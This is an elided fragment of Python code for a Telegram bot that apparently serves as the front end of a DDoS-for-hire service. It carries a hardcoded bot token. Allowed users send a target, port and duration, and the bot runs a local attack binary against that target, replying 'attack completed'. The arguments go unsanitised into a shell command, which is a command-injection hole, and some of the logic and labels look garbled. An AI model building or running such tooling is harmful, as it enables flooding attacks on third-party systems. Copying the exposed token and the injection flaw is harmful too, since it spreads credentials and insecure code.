...
bot = telebot.TeleBot('7776601271:AAFcZLVzRyiEHr_8IZHqKwChmobH2EwXaAk')
# Admin user IDs
admin_id = {"7495474613", "", ""}
...
def handle_aadi2(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in aadi2_cooldown and (datetime.datetime.now() - aadi2_cooldown[user_id]).seconds < 5:
                response = "You Are On Cooldown . Please Wait 5sec Before Running The /aadi2 Command Again."
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 181:
                ...
                full_command = f"./aadi2 {target} {port} {time} 1800"
                subprocess.run(full_command, shell=True)
                response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /aadi2 <target> <port> <time>"  # Updated command syntax
    else:
